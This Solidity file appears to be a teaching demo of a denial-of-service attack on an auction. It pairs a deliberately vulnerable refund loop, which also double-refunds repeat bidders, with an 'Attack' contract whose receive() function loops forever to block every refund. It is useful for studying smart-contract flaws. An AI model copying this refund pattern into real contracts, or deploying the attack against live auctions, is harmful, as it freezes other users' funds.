// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

contract Auction {
    mapping(address => uint) public bidders;
    address[] public allBidders;
    uint public refundProgress;

    function bid() external payable {
        bidders[msg.sender] += msg.value;
        allBidders.push(msg.sender);
    }

    function refund() external {
        for(uint i = refundProgress; i < allBidders.length; i++) {
            console.log(refundProgress);
            address nextBidders = allBidders[i];
            console.log(nextBidders);
            (bool success,) = nextBidders.call{value: bidders[nextBidders]}("");
            console.log("next refund ...");
            require(success, "failed to refund");

            refundProgress++;
        }
    }
}

contract Attack {
    Auction auction;
    bool doHack = true;
    address public owner;

    constructor (address _auction) {
        owner = msg.sender;
        auction = Auction(_auction);
    }

    function doBid() external payable {
        auction.bid{value: msg.value}();
    }

    function toggleHacking() external {
        require(msg.sender == owner, "failed");

        doHack = !doHack;
    }

    receive() external payable {
        if(doHack == true) {
            while(true) {}
        } else {
            (bool success,) = owner.call{value: msg.value}("");
            require(success, "failed");
        }

    }
}